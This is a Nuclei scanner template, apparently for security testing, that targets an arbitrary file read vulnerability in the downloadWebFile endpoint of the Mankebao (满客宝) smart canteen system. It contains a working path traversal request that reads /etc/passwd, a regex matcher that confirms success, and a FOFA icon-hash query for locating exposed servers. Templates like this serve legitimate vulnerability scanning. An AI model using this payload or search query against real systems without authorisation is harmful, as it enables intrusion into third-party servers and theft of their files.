id: mankebao-arbitrary-file-read

info:
  name: 满客宝智慧食堂系统任意文件读取漏洞
  author: onewin
  severity: high
  description: |
    满客宝智慧食堂系统的downloadWebFile接口存在任意文件读取漏洞，攻击者可以通过构造恶意请求读取服务器上的任意文件。
  tags: 满客宝后台管理系统
  metadata:
    fofa-query: icon_hash="-409875651"

http:
  - raw:
      - |
        GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"